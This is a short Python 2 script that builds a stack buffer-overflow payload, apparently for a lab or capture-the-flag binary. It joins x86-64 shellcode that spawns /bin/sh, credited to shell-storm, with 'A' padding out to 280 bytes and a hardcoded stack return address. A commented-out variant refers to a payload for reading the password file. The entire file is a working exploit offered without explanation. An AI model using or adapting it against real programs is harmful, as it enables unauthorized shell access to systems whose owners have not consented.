#!/usr/bin/python

# the shell code is from http://shell-storm.org/shellcode/files/shellcode-806.php
shell_code = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

payload_len = 280 #(0xce38 - 0xcd20)
#target_addr = "\x00\x00\x7f\xff\xff\xff\xcd\x20"
target_addr = "\x00\x00\x7f\xff\xff\xff\xcd\x60"

#payload = read_passwd + 'A'*(payload_len - len(read_passwd)) + target_addr[::-1]
payload = shell_code + 'A'*(payload_len - len(shell_code)) + target_addr[::-1]

print payload

